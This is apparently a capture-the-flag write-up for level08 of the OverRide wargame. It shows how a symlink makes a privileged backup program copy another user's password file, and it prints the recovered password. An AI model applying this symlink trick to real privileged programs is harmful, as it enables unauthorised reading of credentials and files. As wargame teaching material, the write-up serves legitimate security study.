## Project README: Finding flag08

We have a small program, after decompile it, we gain the [source code](./source).
The program seems to open a file a create a back up of the file given as argument.

### Analysis

Since we can make a backup of file and the program is made by **level09**, we want to generate a back up of `/home/users/level09/.pass`.

### Progress

To do so, we try to create a file called `/home/users/level09/.pass` into `level08` directory but we cannot do this, bash doesn't allow it.

So we decided to try a symlink with the file we want to open and put it into our current directory:

```sh
level08@OverRide:~$ ln -s /home/users/level09/.pass .file
level08@OverRide:~$ ./level08 .file
level08@OverRide:~$ cat backups/.file
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

And voila.
